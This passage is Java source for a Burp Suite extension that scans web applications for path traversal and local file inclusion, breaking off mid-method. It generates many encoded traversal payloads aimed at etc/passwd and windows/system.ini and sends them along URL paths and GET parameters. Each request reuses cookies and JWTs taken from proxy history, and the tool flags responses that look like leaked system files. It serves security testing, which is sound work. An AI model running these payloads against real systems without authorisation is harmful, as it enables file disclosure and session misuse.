package com.pathwalker;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.Registration;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.proxy.ProxyHttpRequestResponse;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;
import burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;
import burp.api.montoya.sitemap.SiteMapFilter;

import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.SwingUtilities;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Dimension;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Pattern;

import static burp.api.montoya.http.HttpService.httpService;
import static burp.api.montoya.http.message.requests.HttpRequest.httpRequest;
import static burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue;

public class PathWalkerExtension implements BurpExtension {
    private static final String VERSION = "1.3.0-montoya";

    private static final int PROGRESS_LOG_EVERY = 100;
    private static final int MAX_SITEMAP_ENTRIES = 50_000;
    private static final int MAX_LOADED_URLS = 2_000;
    private static final int MAX_SCAN_TARGETS = 200;
    private static final int MAX_PROXY_HISTORY_ENTRIES = 20_000;
    private static final int MAX_RESPONSE_BYTES = 2_000_000;
    private static final int MAX_LOG_CHARS = 250_000;

    private static final List<String> PAYLOAD_UNITS = Arrays.asList(
            "../", "..%2f", "..\\", "..%5c", "%2e%2e/", "%2e%2e%2f", "%2e%2e\\",
            "%2e%2e%5c", "%%32%65%%32%65%%32%66", ".%2e/", "%2e./", "..;/", ".../",
            "%252e%252e%252f", "%252e%252e%255c", "%c0%ae%c0%ae/", "..%c0%af",
            "..%ef%bc%8f"
    );
    private static final List<String> FILES = Arrays.asList("etc/passwd", "windows/system.ini");
    private static final List<Integer> DEPTHS = Arrays.asList(3, 4, 5, 6, 8, 10);
    private static final List<String> TRAVERSAL_MARKERS = Arrays.asList("%2e", "%5c", "..%2f", "..%5c", "../", "..\\");
    private static final List<String> STATIC_URL_EXTENSIONS = Arrays.asList(".svg", ".css", ".png", ".woff2", ".json", ".js");
    private static final List<String> LINUX_KEYWORDS = Arrays.asList(
            "root:x:", "root:0:0", "daemon:x:", "bin:x:", "sys:x:", "nobody:x:",
            "/bin/bash", "/bin/sh", "/sbin/nologin", "/usr/sbin/nologin", "/usr/bin/zsh",
            "nfsnobody:"
    );
    private static final List<String> WINDOWS_KEYWORDS = Arrays.asList(
            "[386Enh]", "[boot loader]", "[fonts]", "[extensions]", "[mci extensions]",
            "[drivers]", "MMSYSTEM.DLL"
    );
    private static final List<String> ALL_KEYWORDS = joinLists(LINUX_KEYWORDS, WINDOWS_KEYWORDS);

    private static final Pattern PASSWD_LINE = Pattern.compile("^[A-Za-z_][A-Za-z0-9_-]*:[^:\\r\\n]*:[0-9]+:[0-9]+:");
    private static final Pattern PASSWD_HINT = Pattern.compile(
            "root:x?:[0-9]+:[0-9]+:|(?m)^root:[^:\\r\\n]*:0:0:|(?m)^(daemon|bin|sys|sync|games|man|mail|news|www-data|nobody):[^:\\r\\n]*:[0-9]+:[0-9]+:|:[0-9]+:[0-9]+:[^:]*:/bin/|:[0-9]+:[0-9]+:[^:]*:/usr/bin/|nobody:x?:[0-9]+|/bin/bash|/usr/bin/zsh|/sbin/nologin|/usr/sbin/nologin|daemon:x?:[0-9]+|bin:x:[0-9]+|sys:x:[0-9]+"
    );
    private static final Pattern WINDOWS_INI = Pattern.compile("\\[386Enh\\]|\\[boot loader\\]|\\[fonts\\]|\\[drivers\\]|MMSYSTEM\\.DLL", Pattern.CASE_INSENSITIVE);

    private MontoyaApi api;
    private final AtomicBoolean unloaded = new AtomicBoolean(false);
    private final AtomicBoolean stopRequested = new AtomicBoolean(false);
    private final ExecutorService executor = Executors.newCachedThreadPool(r -> {
        Thread thread = new Thread(r, "PathWalker-worker");
        thread.setDaemon(true);
        return thread;
    });

    private final Set<String> reportedIssues = ConcurrentHashMap.newKeySet();
    private final Set<String> totalHits = ConcurrentHashMap.newKeySet();
    private final List<Future<?>> tasks = Collections.synchronizedList(new ArrayList<>());
    private final List<Registration> registrations = Collections.synchronizedList(new ArrayList<>());

    private JPanel mainPanel;
    private JComboBox<String> hostCombo;
    private DefaultTableModel resultsModel;
    private DefaultTableModel targetModel;
    private DefaultTableModel jwtModel;
    private DefaultTableModel cookieModel;
    private JTable targetTable;
    private JTable jwtTable;
    private JTable cookieTable;
    private JTextArea logArea;
    private JLabel countLabel;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        api.extension().setName("PathWalker");

        buildUi();
        registrations.add(api.userInterface().registerSuiteTab("PathWalker", mainPanel));
        registrations.add(api.extension().registerUnloadingHandler(this::unload));

        log("PathWalker loaded (" + VERSION + "). Refresh hosts, select a host, load sitemap URLs, then start scan.");
        runDetectionSelfTest();
    }

    private void unload() {
        unloaded.set(true);
        stopRequested.set(true);
        log("PathWalker unloading. Stopping background work.");

        synchronized (registrations) {
            for (Registration registration : registrations) {
                try {
                    registration.deregister();
                } catch (Exception ignored) {
                }
            }
            registrations.clear();
        }

        synchronized (tasks) {
            for (Future<?> task : tasks) {
                task.cancel(true);
            }
            tasks.clear();
        }
        executor.shutdownNow();
        try {
            executor.awaitTermination(2, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private void buildUi() {
        mainPanel = new JPanel(new BorderLayout());
        JPanel topPanel = new JPanel();
        topPanel.add(new JLabel("Host:"));

        hostCombo = new JComboBox<>();
        hostCombo.setPreferredSize(new Dimension(360, 28));
        topPanel.add(hostCombo);

        JButton refreshButton = new JButton("Refresh Hosts");
        refreshButton.addActionListener(e -> refreshHosts());
        JButton loadButton = new JButton("Load URLs,Cookies/JWTs");
        loadButton.addActionListener(e -> loadUrlsForSelectedHost());
        JButton cookieButton = new JButton("Update Cookies/JWTs");
        cookieButton.addActionListener(e -> loadRecentCookiesForSelectedHost());
        JButton removeUrlButton = new JButton("Remove Selected URLs");
        removeUrlButton.addActionListener(e -> removeSelectedUrls());
        JButton clearLoadedButton = new JButton("Clear loaded URLs, Cookies/JWTs");
        clearLoadedButton.addActionListener(e -> clearLoadedData());
        JButton clearAllButton = new JButton("Clear All");
        clearAllButton.addActionListener(e -> clearAllData());
        JButton startButton = new JButton("Start Scan");
        startButton.addActionListener(e -> startScan());
        JButton stopButton = new JButton("Stop Scan");
        stopButton.addActionListener(e -> stopScan());

        for (JButton button : Arrays.asList(refreshButton, loadButton, cookieButton, removeUrlButton, clearLoadedButton, clearAllButton, startButton, stopButton)) {
            topPanel.add(button);
        }

        countLabel = new JLabel("Loaded URLs: 0");
        topPanel.add(countLabel);

        resultsModel = new DefaultTableModel(new Object[]{"URL", "Status code", "Detection", "Info"}, 0);
        JTable resultsTable = new JTable(resultsModel);
        resultsTable.setAutoResizeMode(JTable.AUTO_RESIZE_SUBSEQUENT_COLUMNS);
        resultsTable.getColumnModel().getColumn(0).setPreferredWidth(900);
        resultsTable.getColumnModel().getColumn(1).setPreferredWidth(100);
        resultsTable.getColumnModel().getColumn(2).setPreferredWidth(150);
        resultsTable.getColumnModel().getColumn(3).setPreferredWidth(100);
        resultsTable.setDefaultRenderer(Object.class, new GreenHitRenderer());

        targetModel = new DefaultTableModel(new Object[]{"Loaded Sitemap URL"}, 0);
        jwtModel = new DefaultTableModel(new Object[]{"JWT Bearer Token"}, 0);
        cookieModel = new DefaultTableModel(new Object[]{"Cookie", "Value"}, 0);
        targetTable = new JTable(targetModel);
        jwtTable = new JTable(jwtModel);
        cookieTable = new JTable(cookieModel);
        logArea = new JTextArea();
        logArea.setEditable(false);

        JSplitPane authSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, new JScrollPane(jwtTable), new JScrollPane(cookieTable));
        authSplit.setResizeWeight(0.35);
        JSplitPane targetCookieSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, new JScrollPane(targetTable), authSplit);
        targetCookieSplit.setResizeWeight(0.62);
        JSplitPane scanSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, new JScrollPane(resultsTable), new JScrollPane(logArea));
        scanSplit.setResizeWeight(0.45);
        JSplitPane split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, targetCookieSplit, scanSplit);
        split.setResizeWeight(0.35);

        mainPanel.add(topPanel, BorderLayout.NORTH);
        mainPanel.add(split, BorderLayout.CENTER);
    }

    private void refreshHosts() {
        log("Refreshing hosts from sitemap in the background.");
        submitTask("Refresh hosts", () -> {
            Set<String> hosts = new LinkedHashSet<>();
            for (HttpRequestResponse entry : sitemapEntries()) {
                if (unloaded.get()) {
                    return;
                }
                try {
                    URI uri = URI.create(entry.request().url());
                    if (uri.getHost() != null) {
                        hosts.add(hostKey(uri));
                    }
                } catch (Exception ignored) {
                }
            }
            SwingUtilities.invokeLater(() -> {
                hostCombo.removeAllItems();
                hosts.stream().sorted().forEach(hostCombo::addItem);
            });
            log("Loaded " + hosts.size() + " host(s) from Burp target sitemap.");
        });
    }

    private void loadUrlsForSelectedHost() {
        String selected = selectedHost();
        if (selected == null) {
            log("No host selected. Click Refresh Hosts first.");
            return;
        }
        log("Loading sitemap URLs and recent auth material for " + selected + " in the background.");
        submitTask("Load URLs for host", () -> {
            List<String> urls = urlsForHost(selected);
            replaceTargetRows(urls);
            log("Loaded " + urls.size() + " URL(s) for host " + selected + " from Burp sitemap.");
            loadRecentCookiesForHost(selected);
        });
    }

    private List<String> urlsForHost(String selected) {
        List<String> urls = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        for (HttpRequestResponse entry : sitemapEntriesForHost(selected)) {
            if (unloaded.get()) {
                break;
            }
            try {
                String url = cleanLoadedUrl(entry.request().url());
                URI uri = URI.create(url);
                if (selectedHostMatches(uri, selected) && seen.add(url)) {
                    urls.add(url);
                    if (urls.size() >= MAX_LOADED_URLS) {
                        log("Loaded URL cap reached for " + selected + "; keeping first " + MAX_LOADED_URLS + " unique URLs.");
                        break;
                    }
                }
            } catch (Exception ignored) {
            }
        }
        return urls;
    }

    private void loadRecentCookiesForSelectedHost() {
        String selected = selectedHost();
        if (selected == null) {
            log("No host selected.");
            return;
        }
        log("Loading recent cookies/JWTs for " + selected + " in the background.");
        submitTask("Load recent cookies", () -> loadRecentCookiesForHost(selected));
    }

    private void loadRecentCookiesForHost(String selected) {
        List<String> matchingCookies = new ArrayList<>();
        List<String> matchingJwts = new ArrayList<>();
        Set<String> seenJwts = new LinkedHashSet<>();
        List<ProxyHttpRequestResponse> history = api.proxy().history(entry -> {
            try {
                HttpRequest request = entry.finalRequest();
                return selectedHostMatches(URI.create(request.url()), selected);
            } catch (Exception e) {
                return false;
            }
        });

        if (history.size() > MAX_PROXY_HISTORY_ENTRIES) {
            log("Proxy history has " + history.size() + " entries; checking the most recent " + MAX_PROXY_HISTORY_ENTRIES + ".");
            history = history.subList(history.size() - MAX_PROXY_HISTORY_ENTRIES, history.size());
        }

        for (int i = history.size() - 1; i >= 0; i--) {
            if (unloaded.get() || (matchingCookies.size() >= 3 && matchingJwts.size() >= 3)) {
                break;
            }
            try {
                HttpRequest request = history.get(i).finalRequest();
                request.headers().forEach(header -> {
                    String name = header.name();
                    String value = header.value();
                    if ("cookie".equalsIgnoreCase(name) && matchingCookies.size() < 3) {
                        matchingCookies.add(value);
                    } else if ("authorization".equalsIgnoreCase(name) && value.toLowerCase(Locale.ROOT).startsWith("bearer ")) {
                        String token = normalizeJwtToken(value);
                        if (!token.isEmpty() && seenJwts.add(token) && matchingJwts.size() < 3) {
                            matchingJwts.add(token);
                        }
                    }
                });
            } catch (Exception ignored) {
            }
        }

        Map<String, String> mergedCookies = new LinkedHashMap<>();
        for (String cookieHeader : matchingCookies) {
            for (String part : cookieHeader.split(";")) {
                int eq = part.indexOf('=');
                if (eq > 0) {
                    String name = part.substring(0, eq).trim();
                    String value = part.substring(eq + 1).trim();
                    if (!name.isEmpty()) {
                        mergedCookies.put(name, value);
                    }
                }
            }
        }

        SwingUtilities.invokeLater(() -> {
            cookieModel.setRowCount(0);
            jwtModel.setRowCount(0);
            mergedCookies.keySet().stream().sorted().forEach(name -> cookieModel.addRow(new Object[]{name, mergedCookies.get(name)}));
            matchingJwts.stream().limit(3).forEach(token -> jwtModel.addRow(new Object[]{token}));
            if (matchingJwts.isEmpty()) {
                jwtModel.addRow(new Object[]{""});
            }
        });
        log("Loaded " + mergedCookies.size() + " unique cookies and " + matchingJwts.size() + " unique JWTs from recent history for " + selected + ".");
    }

    private void startScan() {
        List<String> urls = currentTargetUrls();
        if (urls.isEmpty()) {
            loadUrlsForSelectedHost();
            log("URL loading has started. Start the scan after the load completes.");
            return;
        }
        if (urls.size() > MAX_SCAN_TARGETS) {
            log("Scan target cap reached; scanning first " + MAX_SCAN_TARGETS + " of " + urls.size() + " loaded URL(s).");
            urls = new ArrayList<>(urls.subList(0, MAX_SCAN_TARGETS));
        }
        Map<String, String> cookies = currentCookieValues();
        String jwtToken = currentJwtValue();
        stopRequested.set(false);
        totalHits.clear();
        SwingUtilities.invokeLater(() -> resultsModel.setRowCount(0));
        List<String> scanUrls = new ArrayList<>(urls);
        log("Starting scan for " + scanUrls.size() + " URL(s) with " + cookies.size() + " cookie(s) and JWT: " + (jwtToken.isEmpty() ? "no" : "yes") + ".");
        submitTask("Active scan", () -> runScan(scanUrls, cookies, jwtToken));
    }

    private void stopScan() {
        stopRequested.set(true);
        log("Stop requested. The scanner will halt after the current request.");
    }

    private void runScan(List<String> urls, Map<String, String> cookies, String jwtToken) {
        ScannerSession session = new ScannerSession(cookies, jwtToken);
        log("============================================================\n=== PathWalker (Path Walking + Enhanced Detection) ===\n============================================================");
        for (String url : urls) {
            if (stopRequested.get() || unloaded.get()) {
                break;
            }
            log("============================================================\nTARGET: " + url + "\n============================================================");
            session.testTarget(url);
        }
        if (stopRequested.get()) {
            log("Scan stopped by user.");
        } else {
            log("Scan complete. Found " + totalHits.size() + " vulnerable URL(s).");
        }
    }

    private class ScannerSession {
        private final Map<String, String> cookies;
        private final String jwtToken;
        private final Set<String> cookieNames = new LinkedHashSet<>();
        private final Set<String> hitsCache = new LinkedHashSet<>();
        private final Set<String> scannedCache = new LinkedHashSet<>();
        private final Set<String> sentRequests = new LinkedHashSet<>();
        private int requestCount = 0;

        ScannerSession(Map<String, String> cookies, String jwtToken) {
            this.cookies = new LinkedHashMap<>(cookies);
            this.jwtToken = normalizeJwtToken(jwtToken);
            cookies.keySet().forEach(name -> cookieNames.add(name.toLowerCase(Locale.ROOT)));
        }

        void testTarget(String url) {
            URI parsed = URI.create(url);
            testUrlAsIs(url);
            if (containsAny(url.toLowerCase(Locale.ROOT), TRAVERSAL_MARKERS)) {
                log("[!] URL contains traversal patterns, skipping generated tests");
                return;
            }
            if (rawQuery(parsed).isEmpty()) {
                runPathWalking(parsed);
            } else {
                log("[*] Parameter injection mode: scanning GET parameters only");
                for (String param : parseQuery(rawQuery(parsed)).keySet()) {
                    if (stopRequested.get() || unloaded.get()) {
                        return;
                    }
                    if (cookieNames.contains(param.toLowerCase(Locale.ROOT))) {
                        log("[SKIP] Query parameter name matches a loaded cookie name: " + param);
                        continue;
                    }
                    log("[+] Testing parameter: " + param);
                    runParameterInjection(parsed, param);
                }
            }
        }

        private void testUrlAsIs(String url) {
            log("[ORIGINAL] GET " + url);
            requestAndCheck(url, "original");
        }

        private void runPathWalking(URI parsedUrl) {
            log("[*] Path walking mode");
            for (String segment : pathSegments(parsedUrl.getRawPath())) {
                if (stopRequested.get() || unloaded.get()) {
                    return;
                }
                log("[+] Testing from directory: " + segment);
                String baseUrl = withPathAndQuery(parsedUrl, segment, "");
                for (int depth : DEPTHS) {
                    for (String payloadUnit : PAYLOAD_UNITS) {
                        String traversalBase = payloadUnit.repeat(depth);
                        for (String fileName : FILES) {
                            for (String variant : generateVariants(traversalBase, fileName)) {
                                if (stopRequested.get() || unloaded.get()) {
                                    return;
                                }
                                String targetUrl = baseUrl + (segment.endsWith("/") ? "" : "/") + variant;
                                requestAndCheck(targetUrl, "path_walking:" + segment);
                            }
                        }
                    }
                }
            }
        }

        private void runParameterInjection(URI parsedUrl, String paramName) {
            log("[*] Parameter injection for: " + paramName);
            for (String fileName : FILES) {
                for (String variant : directFileVariants(fileName)) {
                    if (stopRequested.get() || unloaded.get()) {
                        return;
                    }
                    requestAndCheck(urlWithParam(parsedUrl, paramName, variant), "param_direct:" + paramName);
                }
            }
            for (int depth : DEPTHS) {
                for (String payloadUnit : PAYLOAD_UNITS) {
                    String traversalBase = payloadUnit.repeat(depth);
                    for (String fileName : FILES) {
                        for (String variant : generateVariants(traversalBase, fileName)) {
                            if (stopRequested.get() || unloaded.get()) {
                                return;
                            }
                            requestAndCheck(urlWithParam(parsedUrl, paramName, variant), "param:" + paramName);
                        }
                    }
                }
            }
        }

        private boolean requestAndCheck(String url, String source) {
            if (stopRequested.get() || unloaded.get()) {
                return false;
            }
            try {
                String requestKey = requestKey(url);
                if (!sentRequests.add(requestKey)) {
                    return false;
                }
                String signature = buildSignature(url);
                if (!scannedCache.add(signature)) {
                    return false;
                }

                log("[Using] GET " + url);
                requestCount++;
                HttpRequest request = buildGetRequest(url);
                HttpRequestResponse requestResponse = api.http().sendRequest(request);
                HttpResponse response = requestResponse.response();
                int status = response == null ? 0 : response.statusCode();
                if (response != null && response.toByteArray().length() > MAX_RESPONSE_BYTES) {
                    if (requestCount % PROGRESS_LOG_EVERY == 0) {
                        log("[PROGRESS] Tested " + requestCount + " payload request(s). Last status: " + status);
                    }
                    return false;
                }
                String detection = unifiedLfiDetector(response);
                String content = responseText(response);

                if (detection != null) {
                    log("[HIT " + status + "] " + url);
                    log("Detection: " + detection);
                    log("Source: " + source);
                    log("Response preview: " + preview(content));
                    if (isConfirmedLfiDetection(detection) && hitsCache.add(url)) {
                        addHit(url, status, detection);
                        addBurpIssue(requestResponse.copyToTempFile(), detection, source);
                    }
                    return true;
                }
                if (requestCount % PROGRESS_LOG_EVERY == 0) {
                    log("[PROGRESS] Tested " + requestCount + " payload request(s). Last status: " + status);
                }
            } catch (Exception e) {
                log("[TESTED] " + url + " (" + e.getClass().getSimpleName() + ")");
            }
            return false;
        }

        private HttpRequest buildGetRequest(String url) {
            ParsedUrl parsed = ParsedUrl.parse(url);
            List<String> requestLines = new ArrayList<>();
            requestLines.add("GET " + parsed.requestTarget + " HTTP/1.1");
            requestLines.add("Host: " + parsed.hostHeader);
            requestLines.add("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
            requestLines.add("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
            requestLines.add("Accept-Language: en-US,en;q=0.5");
            requestLines.add("Accept-Encoding: identity");
            requestLines.add("Connection: close");
            requestLines.add("Upgrade-Insecure-Requests: 1");
            if (!cookies.isEmpty()) {
                requestLines.add("Cookie: " + cookieHeader(cookies));
            }
            if (!jwtToken.isEmpty()) {
                requestLines.add("Authorization: Bearer " + headerValue(jwtToken));
            }
            String rawRequest = String.join("\r\n", requestLines) + "\r\n\r\n";
            return httpRequest(parsed.service, rawRequest);
        }
    }

    private List<HttpRequestResponse> sitemapEntries() {
        List<HttpRequestResponse> entries = api.siteMap().requestResponses();
        if (entries.size() > MAX_SITEMAP_ENTRIES) {
            log("Sitemap has " + entries.size() + " entries; using first " + MAX_SITEMAP_ENTRIES + " to keep the project responsive.");
            return entries.subList(0, MAX_SITEMAP_ENTRIES);
        }
        return entries;
    }

    private List<HttpRequestResponse> sitemapEntriesForHost(String selected) {
        SiteMapFilter filter = node -> {
            try {
                return selectedHostMatches(URI.create(node.url()), selected);
            } catch (Exception e) {
                return false;
            }
        };
        List<HttpRequestResponse> entries = api.siteMap().requestResponses(filter);
        if (entries.size() > MAX_SITEMAP_ENTRIES) {
            log("Filtered sitemap has " + entries.size() + " entries for " + selected + "; using first " + MAX_SITEMAP_ENTRIES + ".");
            return entries.subList(0, MAX_SITEMAP_ENTRIES);
        }
        return entries;
    }

    private void addHit(String url, int status, String detection) {
        String key = url + "|" + status + "|" + detection;
        if (!totalHits.add(key)) {
            return;
        }
        SwingUtilities.invokeLater(() -> resultsModel.addRow(new Object[]{url, status, detection, "VULNERABLE"}));
    }

    private void addBurpIssue(HttpRequestResponse requestResponse, String detection, String source) {
        try {
            String url = requestResponse.request().url();
            String key = url + "|" + detection;
            if (!reportedIssues.add(key)) {
                return;
            }
            AuditIssue issue = auditIssue(
                    "Local File Inclusion",
                    "The response contains a local file inclusion indicator: <b>" + html(detection) + "</b>.<br><br>Detection source: <b>" + html(source) + "</b>.",
                    "Validate the requested file against an allowlist and ensure the resolved path remains inside the intended directory.",
                    url,
                    AuditIssueSeverity.HIGH,
                    AuditIssueConfidence.CERTAIN,
                    "The application returned content matching known local file signatures.",
                    "Avoid passing user-controlled input to filesystem APIs. Use strict allowlists and canonical path validation.",
                    AuditIssueSeverity.HIGH,
                    requestResponse
            );
            api.siteMap().add(issue);
            log("Added Burp issue for " + url + " (" + detection + ")");
        } catch (Exception e) {
            log("Could not add Burp issue: " + e.getClass().getSimpleName());
        }
    }

    private List<String> currentTargetUrls() {
        if (targetTable.isEditing()) {
            targetTable.getCellEditor().stopCellEditing();
        }
        List<String> urls = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        for (int row = 0; row < targetModel.getRowCount(); row++) {
            Object value = targetModel.getValueAt(row, 0);
            String url = value == null ? "" : value.toString().trim();
            if (!url.isEmpty() && seen.add(url)) {
                urls.add(url);
            }
        }
        return urls;
    }

    private Map<String, String> currentCookieValues() {
        if (cookieTable.isEditing()) {
            cookieTable.getCellEditor().stopCellEditing();
        }
        Map<String, String> cookies = new LinkedHashMap<>();
        for (int row = 0; row < cookieModel.getRowCount(); row++) {
            Object nameValue = cookieModel.getValueAt(row, 0);
            if (nameValue == null || nameValue.toString().trim().isEmpty()) {
                continue;
            }
            Object value = cookieModel.getValueAt(row, 1);
            cookies.put(nameValue.toString().trim(), value == null ? "" : value.toString());
        }
        return cookies;
    }

    private String currentJwtValue() {
        if (jwtTable.isEditing()) {
            jwtTable.getCellEditor().stopCellEditing();
        }
        for (int row = 0; row < jwtModel.getRowCount(); row++) {
            Object value = jwtModel.getValueAt(row, 0);
            String token = normalizeJwtToken(value == null ? "" : value.toString());
            if (!token.isEmpty()) {
                return token;
            }
        }
        return "";
    }

    private void removeSelectedUrls() {
        int[] rows = targetTable.getSelectedRows();
        if (rows.length == 0) {
            log("No loaded URL rows selected.");
            return;
        }
        for (int i = rows.length - 1; i >= 0; i--) {
            targetModel.removeRow(rows[i]);
        }
        updateLoadedUrlCount();
        log("Removed " + rows.length + " URL(s) from the scan list.");
    }

    private void clearLoadedData() {
        targetModel.setRowCount(0);
        cookieModel.setRowCount(0);
        jwtModel.setRowCount(0);
        countLabel.setText("Loaded URLs: 0");
        log("Cleared loaded URLs, cookies, and JWTs.");
    }

    private void clearAllData() {
        clearLoadedData();
        reportedIssues.clear();
        totalHits.clear();
        resultsModel.setRowCount(0);
        logArea.setText("");
        log("Cleared all loaded data, hits, and scanner output.");
    }

    private void replaceTargetRows(List<String> urls) {
        SwingUtilities.invokeLater(() -> {
            targetModel.setRowCount(0);
            urls.forEach(url -> targetModel.addRow(new Object[]{url}));
            updateLoadedUrlCount();
        });
    }

    private void updateLoadedUrlCount() {
        countLabel.setText("Loaded URLs: " + currentTargetUrls().size());
    }

    private void submitTask(String name, Runnable runnable) {
        if (unloaded.get()) {
            return;
        }
        Future<?> future = executor.submit(() -> {
            try {
                runnable.run();
            } catch (Exception e) {
                logException(name + " failed", e);
            }
        });
        tasks.add(future);
    }

    private void log(String message) {
        String line = "[" + LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss")) + "] " + message;
        try {
            api.logging().logToOutput(line);
        } catch (Exception ignored) {
        }
        SwingUtilities.invokeLater(() -> {
            logArea.append(line + "\n");
            int excess = logArea.getDocument().getLength() - MAX_LOG_CHARS;
            if (excess > 0) {
                logArea.replaceRange("", 0, excess);
            }
            logArea.setCaretPosition(logArea.getDocument().getLength());
        });
    }

    private void logException(String message, Exception e) {
        try {
            api.logging().logToError(message + "\n" + stackTrace(e));
        } catch (Exception ignored) {
        }
        log(message + ": " + e.getClass().getSimpleName());
    }

    private void runDetectionSelfTest() {
        String sample = "root:x:0:0:root:/root:/bin/bash\n";
        log(detectLfi(sample) != null ? "Detection self-test passed." : "Detection self-test FAILED.");
    }

    private static String unifiedLfiDetector(HttpResponse response) {
        if (response == null) {
            return null;
        }
        List<String> candidates = new ArrayList<>();
        try {
            candidates.add(response.bodyToString());
        } catch (Exception ignored) {
        }
        try {
            candidates.add(response.toString());
        } catch (Exception ignored) {
        }
        try {
            candidates.add(new String(response.toByteArray().getBytes(), StandardCharsets.ISO_8859_1));
        } catch (Exception ignored) {
        }
        return candidates.stream().map(PathWalkerExtension::detectLfi).filter(d -> d != null).findFirst().orElse(null);
    }

    private static String detectLfi(String content) {
        if (content == null) {
            return null;
        }
        String cleaned = content.replace("\u0000", "");
        if (cleaned.length() < 20) {
            return null;
        }
        String lower = cleaned.toLowerCase(Locale.ROOT);
        for (String keyword : ALL_KEYWORDS) {
            if (lower.contains(keyword.toLowerCase(Locale.ROOT))) {
                return "KEYWORD: " + keyword;
            }
        }
        if (isPasswdFile(cleaned)) {
            return "LINUX_PASSWD";
        }
        if (WINDOWS_INI.matcher(cleaned).find()) {
            return "WINDOWS_INI";
        }
        return null;
    }

    private static boolean isPasswdFile(String content) {
        int passwdLineCount = 0;
        for (String line : content.split("\\R")) {
            if (PASSWD_LINE.matcher(line.trim()).find() && ++passwdLineCount >= 2) {
                return true;
            }
        }
        return PASSWD_HINT.matcher(content).find();
    }

    private static boolean isConfirmedLfiDetection(String detection) {
        return detection != null && !detection.startsWith("POSSIBLE_") && !"BASE64_ENCODED".equals(detection);
    }

    private static List<String> pathSegments(String urlPath) {
        String path = urlPath == null || urlPath.isEmpty() ? "/" : urlPath.trim();
        int lastSlash = path.lastIndexOf('/');
        if (path.substring(lastSlash + 1).contains(".") && !path.endsWith("/")) {
            path = lastSlash <= 0 ? "/" : path.substring(0, lastSlash);
        }
        if (!path.startsWith("/")) {
            path = "/" + path;
        }
        if (!path.endsWith("/")) {
            path += "/";
        }
        String[] rawParts = path.split("/");
        List<String> parts = new ArrayList<>();
        for (String part : rawParts) {
            if (!part.isEmpty()) {
                parts.add(part);
            }
        }
        List<String> segments = new ArrayList<>();
        for (int i = parts.size(); i > 0; i--) {
            segments.add("/" + String.join("/", parts.subList(0, i)) + "/");
        }
        segments.add("/");
        return new ArrayList<>(new LinkedHashSet<>(segments));
    }

    private static List<String> generateVariants(String baseTraversal, String filePath) {
        String cleanFile = stripLeadingSlash(filePath);
        List<String> pathVariants = Arrays.asList(
                cleanFile,
                cleanFile.replace("/", "\\"),
                cleanFile.replace("/", "%2f"),
                cleanFile.replace("/", "%5c"),
                cleanFile.replace("/", "%252f"),
                cleanFile.replace("/", "%255c")
        );
        List<String> traversalVariants = Arrays.asList(
                baseTraversal,
                baseTraversal.replace("../", "..%2f"),
                baseTraversal.replace("../", "%2e%2e%2f"),
                baseTraversal.replace("../", "%252e%252e%252f"),
                baseTraversal.replace("../", ".%2e/"),
                baseTraversal.replace("../", "%2e./"),
                baseTraversal.replace("../", "..;/"),
                baseTraversal.replace("../", ".../"),
                baseTraversal.replace("../", "..\\"),
                baseTraversal.replace("../", "..%5c"),
                baseTraversal.replace("../", "%2e%2e%5c")
        );
        Set<String> payloads = new LinkedHashSet<>();
        for (String traversal : traversalVariants) {
            for (String path : pathVariants) {
                payloads.add(traversal + path);
                payloads.add(traversal + path + "%00");
            }
        }
        return new ArrayList<>(payloads);
    }

    private static List<String> directFileVariants(String filePath) {
        String cleanFile = stripLeadingSlash(filePath);
        return new ArrayList<>(new LinkedHashSet<>(Arrays.asList(
                "/" + cleanFile,
                cleanFile,
                "/" + cleanFile.replace("/", "\\"),
                cleanFile.replace("/", "\\"),
                "%2f" + cleanFile.replace("/", "%2f"),
                cleanFile.replace("/", "%2f"),
                "%5c" + cleanFile.replace("/", "%5c"),
                cleanFile.replace("/", "%5c"),
                "%252f" + cleanFile.replace("/", "%252f"),
                cleanFile.replace("/", "%252f"),
                "%255c" + cleanFile.replace("/", "%255c"),
                cleanFile.replace("/", "%255c"),
                "/" + cleanFile + "%00",
                cleanFile + "%00"
        )));
    }

    private static String cleanLoadedUrl(String url) {
        URI uri = URI.create(url);
        String path = uri.getRawPath() == null ? "" : uri.getRawPath();
        String lower = path.toLowerCase(Locale.ROOT);
        for (String extension : STATIC_URL_EXTENSIONS) {
            if (lower.endsWith(extension)) {
